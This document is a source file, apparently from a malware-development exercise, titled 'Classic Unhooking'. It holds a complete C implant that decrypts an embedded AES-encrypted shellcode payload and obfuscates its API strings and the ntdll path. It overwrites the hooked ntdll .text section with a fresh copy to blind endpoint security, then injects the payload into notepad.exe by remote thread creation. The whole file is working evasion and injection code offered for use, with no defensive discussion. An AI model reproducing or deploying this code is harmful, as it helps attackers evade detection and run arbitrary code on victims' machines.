# Classic Unhooking

### implant.cpp

```c
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <string.h>
#include <winternl.h>
#include <TlHelp32.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

unsigned char key[] = { 0x10, 0xf3, 0x80, 0x80, 0x9b, 0xcb, 0x86, 0x97, 0x05, 0x48, 0x2f, 0x6e, 0x50, 0xdf, 0xc7, 0x23 };
unsigned char payload[] = { 0xbe, 0x18, 0x8b, 0xc0, 0x47, 0x8d, 0xbf, 0x8a, 0x7b, 0x4e, 0x9c, 0x1e, 0x5e, 0x37, 0xaf, 0xf2, 0xa5, 0x9a, 0xdf, 0x0f, 0x58, 0xa4, 0xeb, 0x6f, 0x12, 0x5e, 0xd4, 0x28, 0x74, 0xe7, 0x67, 0xe0, 0xa4, 0x67, 0x99, 0xb4, 0x74, 0x8a, 0xf2, 0xd9, 0xd8, 0x51, 0x2d, 0x70, 0xf1, 0x85, 0x6b, 0xd1, 0x8c, 0x76, 0xde, 0xf1, 0x35, 0x8b, 0xdd, 0x6a, 0x40, 0xfe, 0x79, 0x0b, 0xf8, 0x70, 0xc6, 0x3e, 0x2d, 0x8a, 0x7b, 0x92, 0x48, 0x01, 0x51, 0x6a, 0x25, 0xa4, 0xd6, 0xae, 0xc7, 0x49, 0x54, 0x33, 0x32, 0x59, 0x58, 0x86, 0x36, 0xc9, 0x4e, 0x51, 0xc5, 0x86, 0x43, 0x16, 0x1a, 0x41, 0xf5, 0xb6, 0x43, 0x72, 0x6e, 0x95, 0x74, 0xca, 0x19, 0xe5, 0x64, 0x15, 0x15, 0x74, 0x77, 0x88, 0x87, 0x86, 0xfe, 0x95, 0x93, 0xa6, 0x35, 0x39, 0x1d, 0xac, 0x0d, 0xac, 0x64, 0x6b, 0x09, 0xdf, 0x53, 0xc6, 0x0b, 0x66, 0xcd, 0x14, 0xe5, 0x74, 0xb9, 0xb9, 0x9d, 0x79, 0x18, 0x9b, 0x6d, 0x7c, 0xad, 0x91, 0x76, 0xc1, 0xaf, 0x36, 0xa0, 0x5f, 0xf9, 0xba, 0xdb, 0x07, 0xc0, 0x29, 0xa2, 0xe8, 0x0e, 0x50, 0x5b, 0x47, 0xee, 0xce, 0x0d, 0xd3, 0xee, 0x76, 0xfc, 0xcb, 0xe7, 0x71, 0x9e, 0xac, 0x10, 0x5f, 0xf6, 0x09, 0x93, 0x54, 0x09, 0xcb, 0x0b, 0x57, 0x09, 0x72, 0x12, 0x5d, 0x34, 0x58, 0xb9, 0xff, 0x61, 0x53, 0x4c, 0x4d, 0x39, 0x36, 0xd9, 0x6d, 0xa0, 0x13, 0x14, 0xa0, 0x04, 0x44, 0xfb, 0x3a, 0x64, 0xdc, 0x16, 0xe7, 0xa6, 0xae, 0x04, 0x09, 0xfe, 0xa7, 0xac, 0x89, 0x0d, 0xf2, 0x44, 0x20, 0xe4, 0x03, 0x7a, 0xac, 0xa5, 0x99, 0x4c, 0x15, 0x30, 0x65, 0xf8, 0xaf, 0x13, 0x59, 0xa8, 0x8d, 0x4c, 0x72, 0x2e, 0x9e, 0xab, 0x51, 0xf8, 0xd8, 0x71, 0x50, 0xb5, 0xb8, 0xa8, 0xc9, 0xc9, 0x55, 0x10, 0x27, 0xae, 0x89, 0x09, 0x46, 0xd6, 0x30, 0x68, 0x5a, 0xe0, 0x97, 0x72, 0x7c, 0xae, 0x18, 0x56, 0x05, 0xc4, 0xe6, 0x2e, 0xdb, 0xf3, 0xd1, 0xe6, 0x6b, 0xc7, 0xc5, 0x28, 0xb9, 0x35, 0x56, 0x39, 0x4a, 0xe2, 0x21, 0x94, 0x68, 0x08, 0x8c, 0x21, 0xbe, 0x2e, 0xcf, 0x9e, 0xc2, 0x68, 0x6b, 0x56, 0x86, 0xc7, 0x18, 0xdd, 0xd2, 0x3a, 0xc2, 0xcd, 0xfa, 0x04, 0x7c, 0x94, 0xe8, 0x1f, 0x56, 0xbf, 0x3e, 0x3b, 0x7c, 0x17, 0xeb, 0xd2, 0x72, 0x8c, 0x63, 0xae, 0x18, 0xe1, 0xf1, 0xc1, 0x9c };
unsigned int payload_len = sizeof(payload);

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    DWORD dataLen = payload_len;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)payload, &dataLen)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return 0;
}

void XORcrypt(char str2xor[], size_t len, char key) {
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}

int FindTarget(const wchar_t* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    wchar_t procnameLower[260];
    wchar_t exeNameLower[260];


    wcsncpy_s(procnameLower, 260, procname, _TRUNCATE);
    for (size_t i = 0; procnameLower[i]; i++) {
        procnameLower[i] = towlower(procnameLower[i]);
    }

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        wcsncpy_s(exeNameLower, 260, pe32.szExeFile, _TRUNCATE);
        for (size_t i = 0; exeNameLower[i]; i++) {
            exeNameLower[i] = towlower(exeNameLower[i]);
        }

        if (wcscmp(procnameLower, exeNameLower) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    // Decrypt payload
    AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    /*
        UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
    */
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
    int i;

    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

    // find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy fresh .text section into ntdll memory
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize);

            // restore original protection settings of ntdll memory
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect,
                &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            return 0;
        }
    }

    // failed? .text not found!
    return -1;
}

int main(void) {

    int pid = 0;
    HANDLE hProc = NULL;

    //unsigned char sNtdllPath[] = "c:\\windows\\system32\\";
    unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };

    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

    unsigned int sNtdllPath_len = sizeof(sNtdllPath);
    unsigned int sNtdll_len = sizeof(sNtdll);
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;
    HMODULE hKernel32;

	hKernel32 = GetModuleHandleA((LPCSTR)sKernel32);
    // get function pointers
    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(hKernel32, (LPCSTR)sCreateFileMappingA);
    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(hKernel32, (LPCSTR)sMapViewOfFile);
    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(hKernel32, (LPCSTR)sUnmapViewOfFile);

    // open ntdll.dll
    XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
    hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open ntdll.dll
        return -1;
    }

    // prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed
        CloseHandle(hFile);
        return -1;
    }

    // map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    printf("Check 1!\n"); getchar();

    // remove hooks
    ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pMapping);

    printf("Check 2!\n"); getchar();

    // Clean up.
    UnmapViewOfFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    pid = FindTarget(L"notepad.exe");

    if (pid) {
        printf("Notepad.exe PID = %d\n", pid);

        // try to open target process
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
```
